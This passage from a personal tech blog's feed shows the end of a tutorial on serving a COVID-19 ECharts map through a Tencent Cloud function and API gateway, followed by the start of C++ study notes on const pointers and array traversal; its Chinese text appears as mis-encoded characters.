class="string">&#x27;.suspect .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.dead&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. å¤„ç†ç–«æƒ…åœ°å›¾ä¸­çš„ç¡®è¯Šæ•°æ®æ ¼å¼</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * éœ€è¦ &#123;name: &#x27;xxx&#x27;, value: &#x27;xxx&#x27;&#125; è¿™æ ·çš„æ ¼å¼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> province = disease_data.<span class="property">areaTree</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line"><span class="keyword">let</span> confirmData = province.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: item.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">value</span>: item.<span class="property">total</span>.<span class="property">confirm</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. ç»™ç–«æƒ…åœ°å›¾æ·»åŠ æ ‡é¢˜</span></span><br><span class="line"><span class="attr">title</span>: &#123;</span><br><span class="line">    <span class="attr">text</span>: <span class="string">&#x27;ç–«æƒ…åœ°å›¾&#x27;</span>,</span><br><span class="line">    <span class="attr">subtext</span>: <span class="string">`<span class="subst">$&#123;disease_data.lastUpdateTime&#125;</span> æ›´æ–°`</span>,</span><br><span class="line">    <span class="attr">left</span>: <span class="string">&#x27;right&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5. æ·»åŠ æ•°æ®åˆ†æ®µ</span></span><br><span class="line"><span class="attr">pieces</span>: [</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10000</span>, <span class="attr">label</span>: <span class="string">&#x27;10000äººåŠä»¥ä¸Š&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1000</span>, <span class="attr">max</span>: <span class="number">9999</span>, <span class="attr">label</span>: <span class="string">&#x27;1000-9999äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">500</span>, <span class="attr">max</span>: <span class="number">999</span>, <span class="attr">label</span>: <span class="string">&#x27;500-999äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">100</span>, <span class="attr">max</span>: <span class="number">499</span>, <span class="attr">label</span>: <span class="string">&#x27;100-499äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10</span>, <span class="attr">max</span>: <span class="number">99</span>, <span class="attr">label</span>: <span class="string">&#x27;10-99äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">9</span>, <span class="attr">label</span>: <span class="string">&#x27;1-9äºº&#x27;</span> &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. å¡«å†™ç–«æƒ…åœ°å›¾çš„æ•°æ®åŠæ‚¬æµ®æ¡†çš„å±•ç¤ºä¿¡æ¯</span></span><br><span class="line"><span class="attr">series</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;ç¡®è¯Šç—…ä¾‹&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;map&#x27;</span>,</span><br><span class="line">    <span class="attr">roam</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">map</span>: <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">    <span class="attr">label</span>: &#123;</span><br><span class="line">      <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">emphasis</span>: &#123;</span><br><span class="line">      <span class="attr">label</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: confirmData</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. å®šæ—¶æ‹‰å–</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">updateMap</span>();</span><br><span class="line">&#125;, <span class="number">60000</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦ç®€å•è¯´æ˜çš„æ˜¯ï¼Œè¯¥æ¨¡æ¿æ˜¯ä½¿ç”¨äº†<code>EChart</code>çš„æ¨¡æ¿è¿›è¡Œæ”¹é€ ï¼Œæ¨¡æ¿åœ°å€å¦‚ä¸‹ï¼š<a href="https://www.echartsjs.com/examples/zh/editor.html?c=map-usa">https://www.echartsjs.com/examples/zh/editor.html?c=map-usa</a>ï¼Œä¸‹å›¾æ˜¯æ¨¡æ¿çš„æ•ˆæœã€‚ä½ ä¹Ÿå¯ä»¥ç‚¹å‡»è¯¥æ¨¡æ¿å³ä¸‹è§’çš„<code>Download</code>æŒ‰é’®å°†æ¨¡æ¿çš„<code>html</code>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæŒ‰è‡ªå·±çš„å–œæ¬¢è¿›è¡Œç¼–è¾‘æ”¹é€ ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/73943593-fae5b180-492b-11ea-859e-bdb0f49e3cde.png" alt="ç–«æƒ…åœ°å›¾çš„æ¨¡æ¿"></p><p>å®Œæˆæ¨¡æ¿çš„æ”¹é€ åï¼Œè¯·ç”¨æ’ä»¶æˆ–è€…å‘½ä»¤è¡Œå·¥å…·ï¼Œä¸Šä¼ äº‘å‡½æ•°ã€‚ä¸‹å›¾æ˜¯é€šè¿‡<code>VS Code</code>æ’ä»¶ä¸Šä¼ äº‘å‡½æ•°çš„ç¤ºä¾‹ï¼š</p><p><img src="https://user-images.githubusercontent.com/3348398/73943865-819a8e80-492c-11ea-9bb1-969220c13b3b.png" alt="é€šè¿‡`VS Code`æ’ä»¶ä¸Šä¼ äº‘å‡½æ•°"></p><h2><span id="ä»»åŠ¡ä¸‰-åˆ›å»º-api-ç½‘å…³è§¦å‘å™¨">ä»»åŠ¡ä¸‰ åˆ›å»º API ç½‘å…³è§¦å‘å™¨</span></h2><p>è¿›å…¥æ§åˆ¶å°ï¼Œæ‰¾åˆ°äº‘å‡½æ•°çš„æ§åˆ¶å°ï¼Œå¹¶é€‰æ‹©äº‘å‡½æ•°æ‰€åœ¨çš„åœ°åŒºä»¥åŠå‘½åç©ºé—´ï¼Œç„¶åè¿›å…¥äº‘å‡½æ•°çš„ç¼–è¾‘ç•Œé¢ï¼Œé€‰æ‹©è§¦å‘æ–¹å¼èœå•ï¼Œç„¶åç‚¹å‡»â€œæ·»åŠ è§¦å‘æ–¹å¼â€ï¼ŒæŒ‰ä»¥ä¸‹çš„å†…å®¹æ·»åŠ ä¸€ä¸ª API ç½‘å…³è§¦å‘å™¨ã€‚æ³¨æ„ï¼Œè¯·åŠ¡å¿…å‹¾é€‰â€œå¯ç”¨é›†æˆå“åº”â€ï¼Œè¿™æ ·ç½‘å…³æ‰èƒ½æ­£ç¡®æ¸²æŸ“<code>HTML</code>çš„å†…å®¹ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/73863542-37a5a000-487b-11ea-9961-ecd34f709f6b.png" alt="æ·»åŠ APIç½‘å…³è§¦å‘å™¨"></p><p>åˆ›å»ºå®Œæ¯•åï¼Œå¯ä»¥ API ç½‘å…³è§¦å‘å™¨ä¸­ï¼Œæ‹¿åˆ°è®¿é—®è·¯å¾„è·¯å¾„ï¼Œåœ¨æµè§ˆå™¨ä¸­è¿›è¡Œè®¿é—®ã€‚å¦‚æœéªŒè¯è¿‡æ²¡é—®é¢˜åï¼Œå»ºè®®å°†äº‘å‡½æ•°ï¼Œé€šè¿‡<code>VS Code</code>æ’ä»¶åŒæ­¥ä¸‹æ¥ï¼Œå°†æ—§çš„<code>template.yaml</code>æ–‡ä»¶æ›¿æ¢æ‰ï¼Œè¿™æ ·é¿å…ä¸‹æ¬¡ä¸Šä¼ äº‘å‡½æ•°çš„æ—¶å€™ï¼Œç”Ÿæˆé‡å¤çš„ API ç½‘å…³è§¦å‘å™¨ã€‚åªæœ‰åƒä¸‹é¢çš„<code>Events</code>è§¦å‘äº‹ä»¶é‚£æ ·ï¼Œå°†ç³»ç»Ÿç”Ÿæˆçš„ç½‘å…³è´´ä¸Šå»ï¼Œæ‰ä¸ä¼šé‡å¤ç”Ÿæˆæ–°çš„ç½‘å…³ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Events:</span></span><br><span class="line">  <span class="attr">service-8lqamcni:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">APIGW</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">StageName:</span> <span class="string">release</span></span><br><span class="line">      <span class="attr">ServiceId:</span></span><br><span class="line">      <span class="attr">HttpMethod:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">IntegratedResponse:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure><p>ä½“éªŒåœ°å€ï¼š<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">ç–«æƒ…åœ°å›¾ä½“éªŒ</a></p><h2><span id="ä»»åŠ¡å››-æ·»åŠ è‡ªå®šä¹‰åŸŸå">ä»»åŠ¡å›› æ·»åŠ è‡ªå®šä¹‰åŸŸå</span></h2><p>å¦‚æœè§‰å¾—ç½‘å…³æä¾›çš„åŸŸåè¿‡é•¿ï¼Œåˆæˆ–è€…æ‹…å¿ƒè¿™ç§åŸŸåç”±äºå®‰å…¨é—®é¢˜ä¼šè¢«å¾®ä¿¡ç­‰å¤§å¹³å°å°ç¦ï¼Œå¯ä»¥è‡ªå·±è‡ªè¡Œé…ç½®è‡ªå®šä¹‰åŸŸåã€‚é¦–å…ˆï¼Œåœ¨äº‘å‡½æ•°<code>yiqing</code>çš„æ§åˆ¶å°é¢æ¿é‡Œï¼Œæ‰¾åˆ°ã€è§¦å‘æ–¹å¼ã€‘ï¼Œç„¶åç‚¹å‡»ä»»åŠ¡ä¸‰ä¸­æ·»åŠ è¿‡çš„è§¦å‘å™¨é‡Œçš„ã€API æœåŠ¡åã€‘ï¼Œè¿›å…¥æ›´è¯¦ç»†çš„ç½‘å…³é…ç½®æ§åˆ¶å°ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046219-1e325e80-4a09-11ea-9473-397b02e27821.png" alt="è¿›å…¥ç½‘å…³é…ç½®æ§åˆ¶å°"></p><p>è¿›å…¥ã€è‡ªå®šä¹‰åŸŸåã€‘èœå•ï¼Œæ–°å»ºè‡ªå®šä¹‰åŸŸåï¼Œå¦‚æœæƒ³é…ç½® HTTPS åè®®ï¼Œåˆ™éœ€è¦å»ç”³è¯· HTTPS è¯ä¹¦ï¼ˆè…¾è®¯äº‘æœ‰å…è´¹çš„å¯ä»¥ç”³è¯·ï¼Œå¯ä»¥è·Ÿç€æç¤ºè·³è½¬åˆ°è¯ä¹¦é…ç½®èœå•ï¼‰ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046446-8c772100-4a09-11ea-92db-8e597dcf05b4.png" alt="è‡ªå®šä¹‰åŸŸåèœå•"></p><p>å¯ä»¥æŒ‰ç…§ä¸‹å›¾çš„ç¤ºä¾‹è¿›è¡Œé…ç½®ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæƒ³è®¿é—®çš„è·¯å¾„æ›´æ‰å¹³åŒ–ä¸€ç‚¹ï¼Œè¯·é€‰æ‹©â€œè‡ªå®šä¹‰è·¯å¾„æ˜ å°„â€ï¼Œè·¯å¾„å¡«å…¥<code>/</code>ï¼Œç¯å¢ƒé€‰æ‹©å‘å¸ƒã€‚å¦‚æœä¸è¿™æ ·é…ç½®ï¼Œå¦‚æœåŸæœ¬ç½‘å…³çš„åŸŸåæ˜¯<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing</a>ï¼Œé‚£ä¹ˆé…ç½®å¥½ä¹‹åï¼Œè®¿é—®çš„è·¯å¾„å°±æ˜¯[<a href="https://yiqing.docschina.org/release/demo_yiqing]%E3%80%82%E4%BD%86%E5%A6%82%E6%9E%9C%E9%85%8D%E7%BD%AE%E4%BA%86%60/%60%EF%BC%8C%E9%82%A3%E4%B9%88%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E5%B0%B1%E5%8F%AA%E5%89%A9%E4%B8%8B%60demo_yiqing%60%E4%BA%86%E3%80%82">https://yiqing.docschina.org/release/demo_yiqing]ã€‚ä½†å¦‚æœé…ç½®äº†`/`ï¼Œé‚£ä¹ˆåé¢çš„è·¯å¾„å°±åªå‰©ä¸‹`demo_yiqing`äº†ã€‚</a></p><p><img src="https://user-images.githubusercontent.com/3348398/74046578-c21c0a00-4a09-11ea-846b-e1393e3f8106.png" alt="æ–°å»ºè‡ªå®šä¹‰åŸŸå"></p><p>åœ¨ä¿å­˜é…ç½®ä¿¡æ¯ä¹‹å‰ï¼Œè¯·é¦–å…ˆåœ¨åŸŸåè§£ææœåŠ¡å•†ï¼Œæ ¹æ®å¼¹çª—çš„æç¤ºï¼Œå…ˆæŠŠåŸŸåçš„ CNAME é…ç½®å¥½ã€‚æ¯”å¦‚è¿™é‡Œä½¿ç”¨çš„æ˜¯<a href="https://yiqing.docschina.org/">https://yiqing.docschina.org</a>ï¼ŒåŸŸåï¼Œæç¤ºè¦ CNAME åˆ°<code>service-lltf3zya-1253970226.gz.apigw.tencentcs.com.</code>ã€‚åšå®Œ CNAME åï¼Œå°±å¯ä»¥ä¿å­˜è‡ªå®šä¹‰åŸŸåçš„æ·»åŠ é…ç½®ã€‚ç¨ç­‰ç‰‡åˆ»ï¼Œå°±å¯ä»¥è®¿é—®äº†ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046843-3b1b6180-4a0a-11ea-9a3c-daef71f701f1.png" alt="é…ç½®åŸŸåè§£æ"></p><p>å¦‚æœçœ‹åˆ°é…ç½®åˆ—è¡¨ä¸Šæ˜¾ç¤ºâ€œè§£ææˆåŠŸâ€ï¼Œé‚£è¡¨æ˜ä¸€åˆ‡çš„é™ªç€å·²ç»å¦¥å½“ï¼Œè¯·å°è¯•è®¿é—®ï¼š<a href="https://yiqing.docschina.org/demo_yiqing">https://yiqing.docschina.org/demo_yiqing</a>è¿›è¡Œä½“éªŒå§ï¼</p><pre><code></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="å®ä¹ " scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Java2C++</title>
    <link href="https://disda-coding.github.io/2020/04/18/Java2C/"/>
    <id>https://disda-coding.github.io/2020/04/18/Java2C/</id>
    <published>2020-04-18T15:03:27.000Z</published>
    <updated>2020-04-29T10:34:34.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ€»ç»“ä¸€äº›C++å­¦ä¹ ä¸­ç–‘æƒ‘çš„ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">çŸ¥è¯†ç‚¹</a><ul><li><a href="#const%E5%92%8C%E6%8C%87%E9%92%88">constå’ŒæŒ‡é’ˆ</a></li><li><a href="#constexpr">constexpr</a></li><li><a href="#%E6%95%B0%E7%BB%84">æ•°ç»„</a><ul><li><a href="#%E5%BC%95%E7%94%A8%E9%81%8D%E5%8E%86%E6%B3%95">å¼•ç”¨éå†æ³•ï¼š</a></li><li><a href="#%E4%B8%8B%E6%A0%87%E9%81%8D%E5%8E%86%E6%B3%95">ä¸‹æ ‡éå†æ³•ï¼š</a></li><li><a href="#%E6%8C%87%E9%92%88%E9%81%8D%E5%8E%86%E6%B3%95">æŒ‡é’ˆéå†æ³•ï¼š</a></li></ul></li><li><a href="#%E5%B7%A6%E5%80%BC%E5%92%8C%E5%8F%B3%E5%80%BC">å·¦å€¼å’Œå³å€¼</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">æ‹·è´æ„é€ å‡½æ•°</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E5%88%9D%E5%A7%8B%E5%8C%96">æ‹·è´åˆå§‹åŒ–</a></li><li><a href="#%E9%87%8D%E8%BD%BD%E6%8B%B7%E8%B4%9D%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6">é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦</a></li></ul></li><li><a href="#%E7%BB%83%E4%B9%A0">ç»ƒä¹ </a><ul><li><a href="#943">9.43</a></li><li><a href="#944">9.44</a></li></ul></li></ul><!-- tocstop --><h1><span id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</span></h1><h2><span id="constå’ŒæŒ‡é’ˆ">constå’ŒæŒ‡é’ˆ</span></h2><ul><li><strong>æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼š</strong>ä¸èƒ½ç”¨äºæ”¹å˜å…¶æ‰€æŒ‡å¯¹è±¡çš„å€¼ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *p=&amp;pi;<span class="comment">//piå¿…é¡»è¦ç”¨æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆæŒ‡å‘</span></span><br><span class="line"><span class="type">double</span> dval=<span class="number">3.14</span>;</span><br><span class="line">p=&amp;dval; <span class="comment">//å¯ä»¥ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨pæ”¹å˜dvalçš„å€¼</span></span><br></pre></td></tr></table></figure><p><font color="red">å­˜æ”¾å¸¸é‡å¯¹è±¡çš„åœ°å€å¿…é¡»è¦ä½¿ç”¨æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼Œ</font></p><p><font color="blue">ä½†æ˜¯æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆä¹Ÿå¯ä»¥æŒ‡å‘å˜é‡</font></p><ul><li><strong>constæŒ‡é’ˆ</strong>ï¼šå¸¸é‡æŒ‡é’ˆå¿…é¡»åˆå§‹åŒ–ï¼Œå¸¸é‡æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡åœ°å€ä¸å¯æ”¹å˜ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p=&amp;a; <span class="comment">//på°†ä¸€ç›´æŒ‡å‘a</span></span><br><span class="line"><span class="type">const</span> doublie pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *<span class="type">const</span> pip=&amp;pi; <span class="comment">//pipæ˜¯æŒ‡å‘å¸¸é‡å¯¹è±¡çš„å¸¸é‡æŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure><ul><li>é¡¶å±‚constï¼šè¡¨ç¤ºæŒ‡é’ˆæœ¬èº«æ˜¯ä¸ªå¸¸é‡</li><li>åº•å±‚constï¼š è¡¨ç¤ºæ‰€æŒ‡çš„å¯¹è±¡æ˜¯ä¸ªå¸¸é‡</li></ul><p><font color="orange">æŒ‡é’ˆæŒ‡å‘å¯¹è±¡ï¼ŒæŒ‡é’ˆåœ¨é¡¶å±‚ï¼Œå¯¹è±¡åœ¨åº•å±‚ã€‚</font></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> v1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *p1=&amp;v1;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p2=p1; <span class="comment">//å¯¹ï¼Œå› ä¸ºint*å¯ä»¥è½¬åŒ–ä¸ºconst int*</span></span><br><span class="line">p1=p2;            <span class="comment">//ä¸å¯¹ï¼Œå› ä¸ºp2æ˜¯åº•å±‚constï¼Œp1ä¸æ˜¯ã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œå¯¹è±¡æ‹·è´æ—¶ï¼Œæ‹·å…¥æ‹·å‡ºçš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸åŒçš„åº•å±‚constèµ„æ ¼ã€‚æˆ–è€…ä¸¤ä¸ªå¯¹è±¡æ•°æ®ç±»å‹å¿…é¡»å¯ä»¥è½¬æ¢ã€‚<font color="red">éå¸¸é‡å¯ä»¥è½¬æ¢æˆå¸¸é‡ï¼Œåä¹‹ä¸è¡Œ</font></p><p>åº•å±‚æŒ‡é’ˆçš„æ‹·å…¥ä¸»è¦çœ‹æ˜¯å¦åŒä¸ºåº•å±‚çš„æˆ–è€…æ˜¯éå¸¸é‡ã€‚</p><p>å¸¸é‡æŒ‡é’ˆçš„æ‹·å…¥åªèƒ½æ‹·å…¥å¸¸é‡ã€‚</p><p>é¡¶å±‚æŒ‡é’ˆå› ä¸ºåªèƒ½åˆå§‹åŒ–ä¸€æ¬¡åä¸èƒ½æ”¹å˜æ‰€ä»¥ä¸åšè®¨è®ºã€‚</p><h2><span id="constexpr">constexpr</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> *p=<span class="literal">nullptr</span>; <span class="comment">//åº•å±‚const</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> *q=<span class="literal">nullptr</span>;<span class="comment">//é¡¶å±‚const ç›¸å¯¹äº*const</span></span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„">æ•°ç»„</span></h2><h3><span id="å¼•ç”¨éå†æ³•">å¼•ç”¨éå†æ³•ï¼š</span></h3><p>è¦ä½¿ç”¨èŒƒå›´forè¯­å¥å¤„ç†å¤šç»´æ•°ç»„ï¼Œé™¤äº†æœ€å†…å±‚çš„å¾ªç¯å¤–ï¼Œå…¶ä»–æ‰€æœ‰å¾ªç¯çš„æ§åˆ¶å˜é‡éƒ½åº”è¯¥æ˜¯å¼•ç”¨ç±»å‹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:row)&#123;</span><br><span class="line">        cout &lt;&lt; i;  <span class="comment">//iåªè¯»ï¼Œæ”¹å˜å¯¹æ•°ç»„æ²¡æœ‰å½±å“ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æƒ³è¦å»æ›´æ”¹æ•°ç»„é‡Œé¢çš„å€¼å°±è¦ä½¿ç”¨å¼•ç”¨ç±»å‹å»éå†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;col:row)&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="ä¸‹æ ‡éå†æ³•">ä¸‹æ ‡éå†æ³•ï¼š</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i!=row;++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j=<span class="number">0</span>;j!=col;++j)&#123;</span><br><span class="line">        ia[i][j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>,*p=&amp;i;</span><br><span class="line">*p=<span class="number">2</span>;<span class="comment">//*pæ˜¯içš„ä¸€ä¸ªå¼•ç”¨ï¼Œç›¸å¯¹äº&amp;j=i;</span></span><br></pre></td></tr></table></figure><h3><span id="æŒ‡é’ˆéå†æ³•">æŒ‡é’ˆéå†æ³•ï¼š</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> p=ia;p!=ia+<span class="number">3</span>;++p)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> q=*p;q!=*p+<span class="number">4</span>;++q)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­pä¸­å­˜æ”¾åœ°å€æ˜¯ia[x]çš„åœ°å€è€Œä¸”ia[x]å’Œia[x+1]çš„åœ°å€æ˜¯è¿ç»­çš„ï¼Œè€Œ*pæ˜¯å–ia[x][0]çš„åœ°å€ã€‚</p><h2><span id="å·¦å€¼å’Œå³å€¼">å·¦å€¼å’Œå³å€¼</span></h2><h2><span id="æ‹·è´æ„é€ å‡½æ•°">æ‹·è´æ„é€ å‡½æ•°</span></h2><p>å¦‚æœä¸€ä¸ªæ„é€ 